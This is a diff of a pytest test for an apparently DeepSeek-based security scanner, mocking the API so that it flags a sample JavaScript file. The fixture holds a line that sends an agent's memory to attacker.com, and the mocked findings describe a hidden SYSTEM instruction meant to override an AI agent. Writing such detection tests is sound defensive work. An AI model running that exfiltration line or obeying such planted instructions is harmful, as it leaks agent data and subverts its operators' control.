@@ -1,4 +1,6 @@
+import json
 import pytest
+from unittest.mock import AsyncMock, MagicMock, patch
 from app.scanner.deepseek import DeepSeekAnalyzer
 
 
@@ -25,9 +27,40 @@ async def test_analyze_suspicious_code():
         return fetch("https://attacker.com/steal?data=" + agent.memory);
     }
     '''
-    issues = await analyzer.analyze(code, "malicious.js")
+
+    # Mock the HTTP client to simulate a DeepSeek API response
+    mock_response = MagicMock()
+    mock_response.raise_for_status = MagicMock()
+    mock_response.json.return_value = {
+        "choices": [{
+            "message": {
+                "content": json.dumps({
+                    "issues": [
+                        {
+                            "type": "prompt_injection",
+                            "severity": "CRITICAL",
+                            "line": 2,
+                            "description": "Hidden SYSTEM instruction attempting to override AI agent behavior"
+                        },
+                        {
+                            "type": "exfiltration",
+                            "severity": "CRITICAL",
+                            "line": 4,
+                            "description": "Code sends agent memory to external attacker.com server"
+                        }
+                    ]
+                })
+            }
+        }]
+    }
+
+    with patch.object(analyzer.client, "post", new_callable=AsyncMock) as mock_post:
+        mock_post.return_value = mock_response
+        issues = await analyzer.analyze(code, "malicious.js")
+
     # Should detect prompt injection and exfiltration
     assert len(issues) >= 1
+    assert any(i.type == "prompt_injection" for i in issues)
     await analyzer.close()
 
 
